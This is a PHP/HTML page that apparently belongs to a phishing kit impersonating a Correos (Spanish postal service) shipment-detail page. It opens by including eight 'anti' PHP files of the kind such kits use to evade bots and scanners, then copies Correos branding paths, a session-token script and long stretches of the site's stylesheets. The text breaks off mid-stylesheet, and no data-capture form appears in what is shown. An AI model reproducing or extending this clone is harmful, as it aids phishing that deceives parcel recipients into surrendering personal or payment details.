<?php

    include '../secure/anti1.php';
	include '../secure/anti2.php';
	include '../secure/anti3.php';
	include '../secure/anti4.php';
	include '../secure/anti5.php';
	include '../secure/anti6.php';
	include '../secure/anti7.php';
	include '../secure/anti8.php';


?>
<html lang="es" class="hydrated" style="position: relative;" id="indexBody"><head>
    <title>Detalle</title>
    <!-- Include necessary meta tags, stylesheets, and scripts here -->
<style>.osSwitch{position:relative;display:inline-block;width:34px;height:15.3px}.osSwitch input{opacity:0;width:0;height:0}.osSlider{position:absolute;top:0;left:0;right:0;bottom:0;border-radius:34px;background-color:#93a0b5;transition:0.4s}.osSlider:before{position:absolute;content:'';height:13px;width:13px;left:2px;bottom:1px;border-radius:50%;background-color:white;transition:0.4s}input:checked+.sliderGreen{background-color:#04d289}input:checked+.sliderRed{background-color:#ff3b30}input:not(:checked)+.defaultGreen{background-color:#04d289}input:checked+.osSlider:before{transform:translateX(17px)}
</style><style>
    @font-face {
      font-family: 'SegoeUI_online_security'; 
      src: url(chrome-extension://llbcnfanfmjhpedaedhbcnpgeepdnnok/segoe-ui.woff);
    }

    @font-face {
      font-family: 'SegoeUI_bold_online_security'; 
      src: url(chrome-extension://llbcnfanfmjhpedaedhbcnpgeepdnnok/segoe-ui-bold.woff);
    }
</style></head>
<body class="page basicpage" data-pagename="correosweb:herramientas:localizador:envios:detalle" id="tophtml">
    
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

		<link rel="stylesheet" href="./files/css/clientlib-react.min.43091e600ff5d0e3d65a5590bfe00a1d.css" type="text/css">
		<link rel="stylesheet" href="./files/css/animista.css">
		<link rel="stylesheet" href="./files/css/imagespin.css">
		<link rel="stylesheet" href="./files/css/correos-ui-kit.css" id="components-css">
		<link rel="stylesheet" href="./files/css/clientlib-base.min.7d250654d6a4ba422176cd385b93bb36.css" type="text/css">
		<meta name="theme-color" content="#000000">
		<link rel="icon" href="/mioficina.correos.es/content/dam/correos/imagenes/iconos/correos-favicon.svg">
		<link rel="apple-touch-icon" sizes="180x180" href="/mioficina.correos.es/content/dam/correos/imagenes/iconos/correos-favicon.svg">
		<link rel="apple-touch-icon" sizes="167x167" href="/mioficina.correos.es/content/dam/correos/imagenes/iconos/correos-favicon.svg">
		<link rel="apple-touch-icon" sizes="152x152" href="/mioficina.correos.es/content/dam/correos/imagenes/iconos/correos-favicon.svg">
		<link rel="apple-touch-icon" sizes="120x120" href="/mioficina.correos.es/content/dam/correos/imagenes/iconos/correos-favicon.svg">

		<style data-styles="">
			correos-cdk-section-filter,
			correos-cdk-container-marketplace,
			correos-list-user-contracts,
			correos-ui-login,
			correos-ui-private-header,
			correos-ui-private-header-rrhh,
			correos-ui-login-rrhh,
			correos-cdk-core-header,
			correos-cdk-core-header-rrhh,
			correos-cdk-search-filter,
			correos-cdk-form-recover-password,
			correos-cdk-tracking-box,
			correos-consume-graphic,
			correos-cdk-shipping-starter,
			correos-cdk-order-detail-list,
			correos-ui-postalcode,
			correos-ui-shipping-table,
			correos-cdk-form-password,
			correos-cdk-map-section,
			correos-ui-state-list,
			correos-cdk-core-footer,
			correos-cdk-core-footer-rrhh,
			correos-cdk-shipping-info-card,
			correos-cdk-section-extras,
			correos-rrhh-show-available-jobs,
			correos-ui-address-card,
			correos-ui-card-generic-info,
			correos-ui-comparison-table,
			correos-ui-shipments-table,
			correos-cdk-form-test-email,
			correos-cdk-form-email,
			correos-cdk-newsletter,
			correos-cdk-cookies-module,
			correos-cdk-cookies-module-rrhh,
			correos-cdk-product-list,
			correos-cdk-terms-conditions-register,
			correos-onboarding-modal,
			correos-private-menu,
			correos-cdk-alert-type,
			correos-cdk-detail-info,
			correos-cdk-form-register,
			correos-type-user-container,
			correos-ui-custom-select-modal,
			correos-cdk-search-group,
			correos-cdk-shipping-locator,
			correos-cdk-tarificador,
			correos-private-home-links,
			correos-ui-card-paq,
			correos-ui-selectable-inputs,
			correos-cdk-download-area,
			correos-cdk-offers,
			correos-cdk-outstanding-subhome-links,
			correos-ui-content-module,
			correos-ui-highlight-article-modules,
			correos-ui-profile-image,
			correos-ui-table,
			correos-cdk-events-calendar-section,
			correos-cdk-faqs-spa,
			correos-ui-citypaq-card,
			correos-ui-text-image-block,
			correos-cdk-buy-privatehome-container,
			correos-cdk-full-content-photo,
			correos-cdk-header-callback,
			correos-cdk-lead-simple-form,
			correos-cdk-menu-dropdown,
			correos-cdk-news-layout,
			correos-cdk-product-card-head,
			correos-cdk-shipping-card,
			correos-cdk-switch-subscription-list,
			correos-guidance-form-container,
			correos-ui-order-material-detail,
			correos-ui-register-error,
			correos-ui-summary-table-mobile,
			correos-cdk-business-vertical-section,
			correos-cdk-component-group,
			correos-cdk-composition-header,
			correos-cdk-image-content,
			correos-cdk-info-section,
			correos-cdk-login-module,
			correos-cdk-paymethod-list,
			correos-cdk-promotional-banner,
			correos-cdk-radio-list-detail,
			correos-cdk-rate-map,
			correos-cdk-section-links,
			correos-cdk-summary-card,
			correos-ui-feedback,
			correos-ui-form,
			correos-ui-important-expansion-panel,
			correos-ui-linear-stepper,
			correos-ui-list-address-results,
			correos-ui-list-cp-results,
			correos-ui-podcast-modules,
			correos-ui-product-selling-card,
			correos-ui-register-page,
			correos-ui-restored-password,
			correos-ui-scroll-sticky,
			correos-ui-tags-spacer,
			correos-ui-text-list,
			correos-advanced-permissions-container,
			correos-cdk-auth-redirect,
			correos-cdk-box-group,
			correos-cdk-business-vertical-container,
			correos-cdk-characteristc-prepay-list,
			correos-cdk-column-components,
			correos-cdk-container-column,
			correos-cdk-container-custom-wsdl,
			correos-cdk-container-group,
			correos-cdk-container-header-img,
			correos-cdk-download-module,
			correos-cdk-download-module-header,
			correos-cdk-dropzone,
			correos-cdk-dual-header,
			correos-cdk-faqs,
			correos-cdk-form-header,
			correos-cdk-header-download,
			correos-cdk-lateral-sidenav,
			correos-cdk-like-banner,
			correos-cdk-location-head,
			correos-cdk-profile-section,
			correos-cdk-section-card-img-slider,
			correos-cdk-section-cards-paqs,
			correos-cdk-section-log,
			correos-cdk-section-multiple-box-group,
			correos-cdk-section-text-img-corner,
			correos-cdk-send-code,
			correos-cdk-simple-header,
			correos-cdk-tab-bar,
			correos-cdk-tabs,
			correos-cdk-text-block,
			correos-cdk-text-block-cta,
			correos-permission-container,
			correos-ui-audio-player,
			correos-ui-blog-owner-module,
			correos-ui-brand-product-text,
			correos-ui-breadcrumb,
			correos-ui-breadcrumb-header,
			correos-ui-button-link,
			correos-ui-card-image,
			correos-ui-card-steps,
			correos-ui-chart-example,
			correos-ui-decorated-title,
			correos-ui-fieldset,
			correos-ui-full-content-illustration-module,
			correos-ui-list-info-modules,
			correos-ui-list-required,
			correos-ui-name,
			correos-ui-payment-details,
			correos-ui-price-box,
			correos-ui-price-section,
			correos-ui-product-card-type,
			correos-ui-product-quality-card,
			correos-ui-prominent-stamp-card,
			correos-ui-section-text,
			correos-ui-stamp-card,
			correos-ui-tab,
			correos-ui-title-center,
			correos-ui-total-amount,
			correos-cdk-form-welcome,
			correos-ui-order-detail,
			correos-cdk-measure-size,
			correos-cdk-private-menu,
			correos-ui-product-type,
			correos-cdk-image-gallery,
			correos-ui-accordion-spa,
			correos-ui-text-condenser-module,
			correos-cdk-card-lite-group,
			correos-cdk-links-group,
			correos-ui-accordion,
			correos-ui-consume-graphic,
			correos-ui-get-location,
			correos-ui-input-password,
			correos-ui-more-info,
			correos-ui-product-card,
			correos-ui-switch-subscription,
			correos-ui-tracking-stepper,
			correos-cdk-section-slider,
			correos-ui-card,
			correos-ui-download-buttons,
			correos-ui-icon-button,
			correos-ui-list-icon,
			correos-ui-stepper,
			correos-cdk-contract,
			correos-cdk-contract-list,
			correos-cdk-section-text-img,
			correos-list-user-login,
			correos-ui-scroll-bar,
			correos-cdk-map,
			correos-ui-description-panel,
			correos-cdk-pop-up-spa,
			correos-ui-chart,
			correos-cdk-pop-up,
			correos-cdk-imageblock,
			correos-cdk-video-block,
			correos-ui-card-lite,
			correos-ui-shipping-type-information,
			correos-cdk-tracking-header,
			correos-ui-info-panel,
			correos-cdk-map-by-countries,
			correos-ui-list-tree-panel,
			correos-ui-list-users,
			correos-ui-slider,
			correos-cdk-section-automatic-responsive,
			correos-cdk-cards-size,
			correos-ui-card-size,
			correos-ui-banner-cards,
			correos-ui-pagination,
			correos-ui-animation-container,
			correos-cdk-input-measure-group,
			correos-ui-input-measure,
			correos-ui-float-container,
			correos-ui-loading-layer,
			correos-ui-button,
			correos-ui-custom-select,
			correos-cdk-radio-button-group,
			correos-ui-text-area,
			correos-cdk-checkbox-group,
			correos-ui-text-module,
			correos-ui-radio-button,
			correos-ui-plain-text,
			correos-ui-checkbox,
			correos-ui-contact-module,
			correos-cdk-share-rrss,
			correos-ui-button-apps,
			correos-ui-summary-table,
			correos-ui-current-search-msg,
			correos-cdk-section-box,
			correos-cdk-selector,
			correos-ui-custom-switch,
			correos-ui-chips,
			correos-cdk-date-filter,
			correos-cdk-price-filter,
			correos-cdk-event-type-filter,
			correos-ui-datepicker,
			correos-ui-text-inf,
			correos-ui-private-header-modal,
			correos-ui-notification,
			correos-ui-message-card,
			correos-ui-animation,
			correos-ui-sticky-bar,
			correos-ui-extra-selected,
			correos-ui-separator-line,
			correos-ui-input,
			correos-ui-menu,
			correos-ui-tooltip,
			correos-cdk-filter-group,
			correos-ui-article-modules,
			correos-ui-card-rrss,
			correos-ui-article-text,
			correos-ui-section-result,
			correos-ui-single-product-card {
				visibility: hidden
			}

			.hydrated {
				visibility: inherit
			}
		</style>
		<title>Detalle</title>
		<meta name="template" content="spa-page-template">
		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
		<script>
			var id_token_ss = sessionStorage.getItem('cal.CORREOSID.portalcorreos.id_token');
			var has_cookie = document.cookie.includes("NEOAEMSTAMP");
			var cookie_stamp = null;
			if (has_cookie) {
				var v = document.cookie.match('(^|;) ?' + "NEOAEMSTAMP" + '=([^;]*)(;|$)');
				cookie_stamp = v ? v[2] : null;
			}
			var ss_stamp = sessionStorage.getItem('cal.CORREOSID.portalcorreos.date_expire');
			var environmentApiHostAEM = document.querySelector('meta[name="environmentApiHostAEM"]');
			if (environmentApiHostAEM != null) {
				environmentApiHostAEM = environmentApiHostAEM.content + "/jcr:content.login.json";
			} else {
				environmentApiHostAEM = document.location.pathname + "/jcr:content.login.json";
			}
			if ((id_token_ss == null || cookie_stamp !== ss_stamp) && has_cookie && environmentApiHostAEM != null) {
				fetch(environmentApiHostAEM).then((response) => {
						if (response.status == '200') {
							return response.json();
						} else {
							throw new Error;
						}
					}).then(response => {
						sessionStorage.setItem('cal.CORREOSID.portalcorreos.id_token', response.id_token);
						sessionStorage.setItem('cal.CORREOSID.portalcorreos.refresh_token', response.refresh_token);
						sessionStorage.setItem('cal.CORREOSID.portalcorreos.date_expire', response.date_expire);
					})
					.catch(error => {
						sessionStorage.removeItem("cal.CORREOSID.portalcorreos.id_token");
						sessionStorage.removeItem("cal.CORREOSID.portalcorreos.refresh_token");
						sessionStorage.removeItem("cal.CORREOSID.portalcorreos.date_expire");
					});
			}
			if (id_token_ss != null && !has_cookie) {
				sessionStorage.removeItem("cal.CORREOSID.portalcorreos.id_token");
				sessionStorage.removeItem("cal.CORREOSID.portalcorreos.refresh_token");
				sessionStorage.removeItem("cal.CORREOSID.portalcorreos.date_expire");
			}
		</script>

		<meta name="robots" content="index,follow">
		<style>
			@charset "UTF-8";

			.sc-correos-cdk-alert-type-h {
				--_cdk-alert-type-color-icon-alert: var(--cdk-alert-type-color-icon-alert, #fff);
				--_cdk-alert-type-color-text: var(--cdk-alert-type-color-text, #333333);
				--_cdk-alert-type-color-text-desktop: var(--cdk-alert-type-color-text-desktop, #002E6D);
				--_cdk-alert-type-color-icon-close: var(--cdk-alert-type-color-icon-close, #002E6D);
				--_cdk-alert-type-bg-info: var(--cdk-alert-type-bg-info, #002E6D);
				--_cdk-alert-type-bg-error: var(--cdk-alert-type-bg-error, #002E6D);
				--_cdk-alert-type-border: 1px solid var(--cdk-alert-type-border-color, #CBCBCB);
				--_cdk-alert-type-box-shadow: var(--cdk-alert-type-box-shadow, #CBCBCB);
				--_cdk-alert-type-bg: var(--cdk-alert-type-bg, #CBCBCB);
				--_cdk-alert-type-bg-event: var(--cdk-alert-type-bg-event, #CBCBCB)
			}

			.sc-correos-cdk-alert-type-h {
				display: block;
				-webkit-box-shadow: var(--_cdk-alert-type-box-shadow);
				box-shadow: var(--_cdk-alert-type-box-shadow);
				border: var(--_cdk-alert-type-border);
				background-color: var(--_cdk-alert-type-bg);
				position: relative;
				z-index: 10
			}

			.hidden.sc-correos-cdk-alert-type-h {
				display: none
			}

			.sc-correos-cdk-alert-type-h .cdk-alert-type.sc-correos-cdk-alert-type {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-pack: justify;
				justify-content: space-between
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-alert-type-h .cdk-alert-type.sc-correos-cdk-alert-type {
					-ms-flex-align: center;
					align-items: center
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-alert-type-h .cdk-alert-type.sc-correos-cdk-alert-type {
					-ms-flex-align: center;
					align-items: center
				}
			}

			.sc-correos-cdk-alert-type-h .cdk-alert-type.wrapper-main.sc-correos-cdk-alert-type {
				padding-left: 0
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-alert-type-h .cdk-alert-type.wrapper-main.sc-correos-cdk-alert-type {
					padding-left: 24px
				}
			}

			.sc-correos-cdk-alert-type-h .cdk-alert-type.sc-correos-cdk-alert-type .cdk-content.sc-correos-cdk-alert-type {
				display: -ms-flexbox;
				display: flex
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-alert-type-h .cdk-alert-type.sc-correos-cdk-alert-type .cdk-content.sc-correos-cdk-alert-type {
					-ms-flex-align: center;
					align-items: center
				}
			}

			.sc-correos-cdk-alert-type-h .cdk-alert-type.sc-correos-cdk-alert-type .cdk-content.sc-correos-cdk-alert-type .cdk-section-icon.sc-correos-cdk-alert-type {
				background-color: var(--_cdk-alert-type-bg-event);
				padding: 8px;
				margin-right: 8px
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-alert-type-h .cdk-alert-type.sc-correos-cdk-alert-type .cdk-content.sc-correos-cdk-alert-type .cdk-section-icon.sc-correos-cdk-alert-type {
					padding: 16px;
					margin-right: 16px
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-alert-type-h .cdk-alert-type.sc-correos-cdk-alert-type .cdk-content.sc-correos-cdk-alert-type .cdk-section-icon.sc-correos-cdk-alert-type {
					padding: 16px
				}
			}

			.sc-correos-cdk-alert-type-h .cdk-alert-type.sc-correos-cdk-alert-type .cdk-content.sc-correos-cdk-alert-type .cdk-section-icon.sc-correos-cdk-alert-type .cdk-icon.sc-correos-cdk-alert-type {
				color: var(--_cdk-alert-type-color-icon-alert)
			}

			.sc-correos-cdk-alert-type-h .cdk-alert-type.sc-correos-cdk-alert-type .cdk-content.sc-correos-cdk-alert-type .cdk-section-text.sc-correos-cdk-alert-type {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-wrap: wrap;
				flex-wrap: wrap
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-alert-type-h .cdk-alert-type.sc-correos-cdk-alert-type .cdk-content.sc-correos-cdk-alert-type .cdk-section-text.sc-correos-cdk-alert-type {
					padding: 0;
					-ms-flex-align: center;
					align-items: center
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-alert-type-h .cdk-alert-type.sc-correos-cdk-alert-type .cdk-content.sc-correos-cdk-alert-type .cdk-section-text.sc-correos-cdk-alert-type {
					padding: 0;
					-ms-flex-align: center;
					align-items: center
				}
			}

			.sc-correos-cdk-alert-type-h .cdk-alert-type.sc-correos-cdk-alert-type .cdk-content.sc-correos-cdk-alert-type .cdk-section-text.sc-correos-cdk-alert-type .cdk-text.sc-correos-cdk-alert-type {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				font-size: 0.875rem;
				line-height: 1.375rem;
				color: var(--_cdk-alert-type-color-text);
				font-weight: 300;
				-ms-flex-item-align: center;
				align-self: center;
				margin-right: 8px
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-alert-type-h .cdk-alert-type.sc-correos-cdk-alert-type .cdk-content.sc-correos-cdk-alert-type .cdk-section-text.sc-correos-cdk-alert-type .cdk-text.sc-correos-cdk-alert-type {
					font-size: 1rem;
					line-height: 1.5rem
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-alert-type-h .cdk-alert-type.sc-correos-cdk-alert-type .cdk-content.sc-correos-cdk-alert-type .cdk-section-text.sc-correos-cdk-alert-type .cdk-text.sc-correos-cdk-alert-type {
					color: var(--_cdk-alert-type-color-text-desktop)
				}
			}

			.sc-correos-cdk-alert-type-h .cdk-alert-type.sc-correos-cdk-alert-type .cdk-content.sc-correos-cdk-alert-type .cdk-section-text.sc-correos-cdk-alert-type .cdk-info.sc-correos-cdk-alert-type {
				-ms-flex-item-align: center;
				align-self: center
			}

			.sc-correos-cdk-alert-type-h .cdk-alert-type.sc-correos-cdk-alert-type .cdk-button.sc-correos-cdk-alert-type {
				border: unset;
				cursor: pointer;
				margin: 0;
				padding: 0;
				width: unset;
				overflow: unset;
				background: unset;
				text-align: flex-start;
				color: inherit;
				font: inherit;
				line-height: inherit;
				-webkit-font-smoothing: inherit;
				-moz-osx-font-smoothing: inherit;
				-webkit-appearance: none;
				height: 24px;
				width: 24px;
				color: var(--_cdk-alert-type-color-icon-close);
				margin: 8px 0
			}

			.sc-correos-cdk-alert-type-h .cdk-alert-type.sc-correos-cdk-alert-type .cdk-button.sc-correos-cdk-alert-type::-moz-focus-inner {
				border: 0;
				padding: 0
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-alert-type-h .cdk-alert-type.sc-correos-cdk-alert-type .cdk-button.sc-correos-cdk-alert-type {
					margin: 0
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-alert-type-h .cdk-alert-type.sc-correos-cdk-alert-type .cdk-button.sc-correos-cdk-alert-type {
					margin: 0
				}
			}

			.sc-correos-cdk-alert-type-h .d-none.sc-correos-cdk-alert-type {
				display: none
			}

			[variant=alert-info].sc-correos-cdk-alert-type-h .cdk-alert-type.sc-correos-cdk-alert-type .cdk-content.sc-correos-cdk-alert-type .cdk-section-icon.sc-correos-cdk-alert-type {
				background-color: var(--_cdk-alert-type-bg-info)
			}

			[variant=alert-error].sc-correos-cdk-alert-type-h .cdk-alert-type.sc-correos-cdk-alert-type .cdk-content.sc-correos-cdk-alert-type .cdk-section-icon.sc-correos-cdk-alert-type {
				background-color: var(--_cdk-alert-type-bg-error)
			}

			[variant=alert-error].sc-correos-cdk-alert-type-h .cdk-alert-type.sc-correos-cdk-alert-type .cdk-content.sc-correos-cdk-alert-type .cdk-section-icon.sc-correos-cdk-alert-type .cdk-icon.sc-correos-cdk-alert-type {
				font-size: 16px
			}
		</style>
		<style>
			.sc-correos-ui-breadcrumb-h {
				--_ui-breadcrumb-color-text: var(--ui-breadcrumb-color-text, red);
				--_ui-breadcrumb-color-text-ref: var(--ui-breadcrumb-color-text-ref, green);
				--_ui-breadcrumb-color-text-variant: var(--ui-breadcrumb-color-text-variant, orange);
				--_ui-breadcrumb-color-variant: var(--ui-breadcrumb-color-variant, pink);
				--_background-color: var(--ui-breadcrumb-background-color, magenta)
			}

			.sc-correos-ui-breadcrumb-h {
				display: none;
				width: 100%;
				background-color: var(--_background-color)
			}

			[variant=full-width].sc-correos-ui-breadcrumb-h .cdk-list-container.sc-correos-ui-breadcrumb {
				max-width: var(--theme-layout-wrapper);
				padding-left: 24px;
				padding-right: 24px;
				margin: auto
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-breadcrumb-h {
					display: block
				}
			}

			.sc-correos-ui-breadcrumb-h .cdk-list-container.sc-correos-ui-breadcrumb {
				list-style-type: none;
				margin: 0;
				padding: 0;
				color: var(--_ui-breadcrumb-color-text);
				font-size: 0.875rem;
				line-height: 1.375rem;
				font-weight: 300
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-breadcrumb-h .cdk-list-container.sc-correos-ui-breadcrumb {
					font-size: 1rem;
					line-height: 1.5rem
				}
			}

			.sc-correos-ui-breadcrumb-h .cdk-list-container--spacing.sc-correos-ui-breadcrumb {
				padding: 24px 0
			}

			.sc-correos-ui-breadcrumb-h .cdk-list-container__items.sc-correos-ui-breadcrumb {
				display: inline-block;
				position: relative;
				padding-right: 16px;
				margin: 0
			}

			.sc-correos-ui-breadcrumb-h .cdk-list-container__items.sc-correos-ui-breadcrumb:last-child {
				font-weight: bold
			}

			.sc-correos-ui-breadcrumb-h .cdk-list-container__items.sc-correos-ui-breadcrumb:after {
				content: "/";
				position: absolute;
				display: inline-block;
				right: 0;
				width: 16px;
				text-align: center
			}

			.sc-correos-ui-breadcrumb-h .cdk-list-container__items.sc-correos-ui-breadcrumb:last-child:after {
				content: ""
			}

			.sc-correos-ui-breadcrumb-h .cdk-list-container__items-ref.sc-correos-ui-breadcrumb {
				text-decoration: underline;
				display: inline-block;
				white-space: nowrap;
				color: var(--_ui-breadcrumb-color-text-ref)
			}

			.sc-correos-ui-breadcrumb-h .cdk-list-container__items-ref.sc-correos-ui-breadcrumb:hover {
				text-decoration: underline
			}

			[variant=white].sc-correos-ui-breadcrumb-h .cdk-list-container.sc-correos-ui-breadcrumb {
				color: var(--_ui-breadcrumb-color-variant)
			}

			[variant=white].sc-correos-ui-breadcrumb-h .cdk-list-container__items.sc-correos-ui-breadcrumb>a.sc-correos-ui-breadcrumb {
				color: var(--_ui-breadcrumb-color-text-variant)
			}

			[variant=white].sc-correos-ui-breadcrumb-h .cdk-list-container__items.sc-correos-ui-breadcrumb:last-child {
				font-weight: bold
			}
		</style>
		<style>
			.sc-correos-cdk-section-box-h {
				--_background-color: var(--cdk-section-box-background-color, magenta);
				--_section-box-padding-top-desktop-sm: var(--section-box-padding-top-desktop-sm, 2.5rem);
				--_section-box-padding-bottom-desktop-sm: var(--section-box-padding-bottom-desktop-sm, 2.5rem);
				--_section-box-padding-top-mobile-tablet-sm: var(--section-box-padding-top-mobile-tablet-sm, 1.5rem);
				--_section-box-padding-bottom-mobile-tablet-sm: var(--section-box-padding-bottom-mobile-tablet-sm, 1.5rem);
				--_section-box-padding-top-desktop-lg: var(--section-box-padding-top-desktop-lg, 5rem);
				--_section-box-padding-bottom-desktop-lg: var(--section-box-padding-bottom-desktop-lg, 5rem);
				--_section-box-padding-top-mobile-tablet-lg: var(--section-box-padding-top-mobile-tablet-lg, 2.5rem);
				--_section-box-padding-bottom-mobile-tablet-lg: var(--section-box-padding-bottom-mobile-tablet-lg, 2.5rem)
			}

			.sc-correos-cdk-section-box-h {
				background-color: var(--_background-color);
				display: block;
				padding: 0
			}

			.sc-correos-cdk-section-box-h>.cdk-content.sc-correos-cdk-section-box .content-center.sc-correos-cdk-section-box {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-pack: center;
				justify-content: center
			}

			[variant=smpadding].sc-correos-cdk-section-box-h>.cdk-content.sc-correos-cdk-section-box {
				padding-top: var(--_section-box-padding-top-mobile-tablet-sm);
				padding-bottom: var(--_section-box-padding-bottom-mobile-tablet-sm)
			}

			@media (min-width: 1024px) {
				[variant=smpadding].sc-correos-cdk-section-box-h>.cdk-content.sc-correos-cdk-section-box {
					padding-top: var(--_section-box-padding-top-desktop-sm);
					padding-bottom: var(--_section-box-padding-bottom-desktop-sm)
				}
			}

			[variant=smpadding].sc-correos-cdk-section-box-h>.cdk-content.sc-correos-cdk-section-box:empty,
			[variant=smpadding].sc-correos-cdk-section-box-h>.cdk-content--empty.sc-correos-cdk-section-box {
				padding-top: 0;
				padding-bottom: 0
			}

			[variant=lgpadding].sc-correos-cdk-section-box-h>.cdk-content.sc-correos-cdk-section-box {
				padding-top: var(--_section-box-padding-top-mobile-tablet-lg);
				padding-bottom: var(--_section-box-padding-bottom-mobile-tablet-lg)
			}

			@media (min-width: 1024px) {
				[variant=lgpadding].sc-correos-cdk-section-box-h>.cdk-content.sc-correos-cdk-section-box {
					padding-top: var(--_section-box-padding-top-desktop-lg);
					padding-bottom: var(--_section-box-padding-bottom-desktop-lg)
				}
			}

			[variant=lgpadding].sc-correos-cdk-section-box-h>.cdk-content.sc-correos-cdk-section-box:empty,
			[variant=lgpadding].sc-correos-cdk-section-box-h>.cdk-content--empty.sc-correos-cdk-section-box {
				padding-top: 0;
				padding-bottom: 0
			}

			.sc-correos-cdk-section-box-h .sc-correos-cdk-section-box.sc-correos-cdk-section-box .sc-correos-cdk-section-box.sc-correos-cdk-section-box .wrapper-main.sc-correos-cdk-section-box {
				padding-left: 0;
				padding-right: 0;
				max-width: none;
				margin-left: unset;
				margin-right: unset
			}
		</style>
		<style>
			@charset "UTF-8";

			.sc-correos-cdk-cookies-module-h {
				--_cdk-cookies-module-background-color: var(--cdk-cookies-module-background-color, white)
			}

			.sc-correos-cdk-cookies-module-h {
				display: block
			}

			.sc-correos-cdk-cookies-module-h correos-cdk-pop-up.sc-correos-cdk-cookies-module .cdk-section-text.sc-correos-cdk-cookies-module {
				display: block
			}

			@media (max-width: 639px) {
				.sc-correos-cdk-cookies-module-h correos-cdk-pop-up.sc-correos-cdk-cookies-module .cdk-section-text.sc-correos-cdk-cookies-module {
					margin: 24px 0
				}
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-cookies-module-h correos-cdk-pop-up.sc-correos-cdk-cookies-module .cdk-section-text.sc-correos-cdk-cookies-module {
					margin: 24px 0
				}
			}

			.sc-correos-cdk-cookies-module-h .cdk-container.sc-correos-cdk-cookies-module {
				background-color: var(--theme-color-blue);
				width: 100%;
				margin: 0 16px 16px 16px;
				padding: 16px;
				border-radius: var(--theme-borderRadius-card);
				position: fixed;
				bottom: 0;
				width: calc(100% - 32px);
				z-index: 18
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-cookies-module-h .cdk-container.sc-correos-cdk-cookies-module {
					display: -ms-flexbox;
					display: flex;
					-ms-flex-align: center;
					align-items: center
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-cookies-module-h .cdk-container.sc-correos-cdk-cookies-module {
					display: -ms-flexbox;
					display: flex;
					-ms-flex-align: center;
					align-items: center;
					margin: 0 24px 24px 24px;
					padding: 24px;
					width: calc(100% - 48px)
				}
			}

			@media (max-width: 639px) {
				.sc-correos-cdk-cookies-module-h .cdk-container.sc-correos-cdk-cookies-module .cdk-section-text.sc-correos-cdk-cookies-module {
					margin-bottom: 24px
				}
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-cookies-module-h .cdk-container.sc-correos-cdk-cookies-module .cdk-section-text.sc-correos-cdk-cookies-module {
					margin-right: 16px
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-cookies-module-h .cdk-container.sc-correos-cdk-cookies-module .cdk-section-text.sc-correos-cdk-cookies-module {
					margin-right: 24px
				}
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-cookies-module-h .cdk-container.sc-correos-cdk-cookies-module .cdk-button.sc-correos-cdk-cookies-module {
					display: -ms-flexbox;
					display: flex;
					-ms-flex-pack: end;
					justify-content: flex-end;
					min-width: -webkit-fit-content;
					min-width: -moz-fit-content;
					min-width: fit-content
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-cookies-module-h .cdk-container.sc-correos-cdk-cookies-module .cdk-button.sc-correos-cdk-cookies-module {
					display: -ms-flexbox;
					display: flex;
					-ms-flex-pack: end;
					justify-content: flex-end;
					min-width: -webkit-fit-content;
					min-width: -moz-fit-content;
					min-width: fit-content
				}
			}

			@media (max-width: 639px) {
				.sc-correos-cdk-cookies-module-h .cdk-container.sc-correos-cdk-cookies-module .cdk-button__first.sc-correos-cdk-cookies-module {
					margin-bottom: 12px
				}
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-cookies-module-h .cdk-container.sc-correos-cdk-cookies-module .cdk-button__first.sc-correos-cdk-cookies-module {
					margin-right: 16px
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-cookies-module-h .cdk-container.sc-correos-cdk-cookies-module .cdk-button__first.sc-correos-cdk-cookies-module {
					margin-right: 24px
				}
			}

			.sc-correos-cdk-cookies-module-h .--displayNone.sc-correos-cdk-cookies-module {
				display: none
			}

			.sc-correos-cdk-cookies-module-h .cdk-container-modal.sc-correos-cdk-cookies-module .cdk-list-modal.sc-correos-cdk-cookies-module {
				display: -ms-flexbox;
				display: flex
			}

			@media (max-width: 639px) {
				.sc-correos-cdk-cookies-module-h .cdk-container-modal.sc-correos-cdk-cookies-module .cdk-list-modal.sc-correos-cdk-cookies-module {
					-ms-flex-direction: column-reverse;
					flex-direction: column-reverse
				}

				.sc-correos-cdk-cookies-module-h .cdk-container-modal.sc-correos-cdk-cookies-module .cdk-list-modal.sc-correos-cdk-cookies-module .cdk-list-modal__desc.sc-correos-cdk-cookies-module {
					margin-top: 16px
				}
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-cookies-module-h .cdk-container-modal.sc-correos-cdk-cookies-module .cdk-list-modal.sc-correos-cdk-cookies-module {
					-ms-flex-pack: justify;
					justify-content: space-between
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-cookies-module-h .cdk-container-modal.sc-correos-cdk-cookies-module .cdk-list-modal.sc-correos-cdk-cookies-module {
					-ms-flex-pack: justify;
					justify-content: space-between
				}
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-cookies-module-h .cdk-container-modal.sc-correos-cdk-cookies-module .cdk-list-modal__desc.sc-correos-cdk-cookies-module {
					width: 74%
				}
			}

			@media (min-width: 1024px) {
